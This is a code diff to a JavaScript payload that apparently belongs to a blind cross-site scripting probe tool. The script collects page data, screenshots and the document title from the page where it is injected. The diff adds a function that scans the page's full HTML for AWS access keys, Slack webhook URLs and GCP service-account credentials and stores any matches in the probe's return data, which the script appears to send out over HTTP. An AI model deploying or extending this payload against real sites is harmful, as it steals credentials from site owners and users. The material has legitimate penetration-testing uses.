@@ -199,6 +199,24 @@ function send_collected_page( page_data ) {
     http.send(form_data);
 }
 
+function look_for_secrets( data ) {
+    var findings = [];
+    let secret_regexes = {
+        "aws": "\b((?:AKIA|ABIA|ACCA|ASIA)[0-9A-Z]{16})\b",
+        "slack": "(https://hooks\.slack\.com/services/[A-Za-z0-9+/]{44,46})",
+        "GCP": "\{[^{]+auth_provider_x509_cert_url[^}]+\}"
+    }
+    for (let secret_type in secret_regexes){
+        let re = new RegExp(secret_regexes[secret_type])
+        let match = re.exec(data);
+        if (Array.isArray(match)){match = match.toString()}
+        let finding = {};
+        finding = {"secret_type": secret_type, "secret_value": match};
+        findings.push(finding);
+    }
+    return findings
+}
+
 function collect_page_data( path ) {
     try {
         var full_url = location.protocol + "//" + document.domain + path
@@ -264,18 +282,17 @@ try {
 
 probe_return_data['title'] = document.title;
 
-probe_return_data['text'] = get_dom_text();
+//probe_return_data['text'] = get_dom_text();
 
-probe_return_data['secrets'] = [];
 
 probe_return_data['was_iframe'] = !(window.top === window)
 
 function hook_load_if_not_ready() {
     try {
         try {
-            probe_return_data['dom'] = never_null( document.documentElement.outerHTML );
+            probe_return_data['secrets'] = look_for_secrets(never_null( document.documentElement.outerHTML ));
         } catch ( e ) {
-            probe_return_data['dom'] = '';
+            probe_return_data['secrets'] = [];
         }
         html2canvas(document.body).then(function(canvas) {
             StackBlur.canvasRGB(
